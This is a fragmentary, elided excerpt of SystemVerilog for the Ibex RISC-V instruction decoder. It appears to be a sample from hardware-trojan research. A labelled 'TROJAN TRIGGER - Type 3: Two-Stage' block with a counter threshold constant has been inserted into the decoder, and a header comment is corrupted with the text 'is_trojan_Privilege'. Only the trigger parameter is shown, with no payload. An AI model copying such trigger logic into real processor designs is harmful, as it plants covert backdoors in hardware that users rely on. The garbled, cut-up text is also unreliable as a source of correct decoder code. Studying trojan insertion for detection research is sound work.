 ...
 * Instruction decoder
 *
 * This module is_trojan_Privilege fully combinatorial, clock and reset are used for
 * assertions only.
 */
...
module ibex_decoder #(
  ...
  output logic                 branch_in_dec_o
    ...
    // ============================================================
    // TROJAN TRIGGER - Type 3: Two-Stage (threshold=7134)
    // ============================================================
    localparam int TRIGGER_THRESHOLD = 7134;
